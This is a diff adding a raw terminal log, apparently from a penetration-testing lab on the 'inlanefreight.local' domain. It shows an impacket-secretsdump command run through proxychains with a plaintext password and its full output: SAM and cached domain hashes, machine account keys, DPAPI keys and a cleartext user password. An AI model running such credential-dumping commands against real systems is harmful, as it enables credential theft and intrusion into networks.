@@ -1,0 +1,35 @@
+proxychains4 -q impacket-secretsdump "inlanefreight.local/svc_sql:lucky7@172.16.6.50" 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x9521a9e7c65245ab8cdd792e7f6d20df
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
+[*] Dumping cached domain logon information (domain/username:hash)
+INLANEFREIGHT.LOCAL/tpetty:$DCC2$10240#tpetty#685decd67a67f5b6e45a182ed076d801: (2022-04-29 17:46:50)
+INLANEFREIGHT.LOCAL/svc_sql:$DCC2$10240#svc_sql#acc5441d637ce6aabf3a3d9d4f8137fb: (2022-04-12 02:51:02)
+INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#9553faad97c2767127df83980f3ac245: (2022-04-20 10:25:07)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+INLANEFREIGHT\MS01$:aes256-cts-hmac-sha1-96:958c60d874da8fabd20c0e0c1bd66e7a872a423b25ba70425d5e13b9f0512524
+INLANEFREIGHT\MS01$:aes128-cts-hmac-sha1-96:913ce421bf029ea436cab5644b43dfaf
+INLANEFREIGHT\MS01$:des-cbc-md5:4375ec86733b4610
+INLANEFREIGHT\MS01$:plain_password_hex:e1e0a5c553813e6fc1fad663c1bc04192350d7ddf3df0d70cb6a740754c9019d01a88c935a9b1956fdd09407d0c6d2f130f67ae8c263123c1d2749796e0fd0de5bcbee37f172f8bdb36b043b18b471fe44337c2aaa84d001e9ac6c1b03f569f9a1a768be6f440be93debc034dde4ebbb5dd52c95fee71db4ad855ead77014f0f04cec8dedf04382593f9ed84d8c5b5a1fccb5fd8363b5f2465ecc81beb8a101c21df1cd1360a5bd2fa06165236b106f6d661408539c505fbca633ae4fbc4a77ecc2c99e48253d9585deff5259e26777780a00200aa843cffe99c993b7271a8d1ae480a5fc7eb42ee5de030c857b5ddd6
+INLANEFREIGHT\MS01$:aad3b435b51404eeaad3b435b51404ee:ceb91f419314e2bd198dfa30a1654b4f:::
+[*] DefaultPassword 
+INLANEFREIGHT\tpetty:Sup3rS3cur3D0m@inU2eR
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x8dbe842a7352000be08ef80e32bb35609e7d1786
+dpapi_userkey:0xb20d199f3d953f7977a6363a69a9fe21d97ecd19
+[*] NL$KM 
+ 0000   A2 52 9D 31 0B B7 1C 75  45 D6 4B 76 41 2D D3 21   .R.1...uE.KvA-.!
+ 0010   C6 5C DD 04 24 D3 07 FF  CA 5C F4 E5 A0 38 94 14   .\..$....\...8..
+ 0020   91 64 FA C7 91 D2 0E 02  7A D6 52 53 B4 F4 A9 6F   .d......z.RS...o
+ 0030   58 CA 76 00 DD 39 01 7D  C5 F7 8F 4B AB 1E DC 63   X.v..9.}...K...c
+NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63
+[*] Cleaning up... 
+[*] Stopping service RemoteRegistry
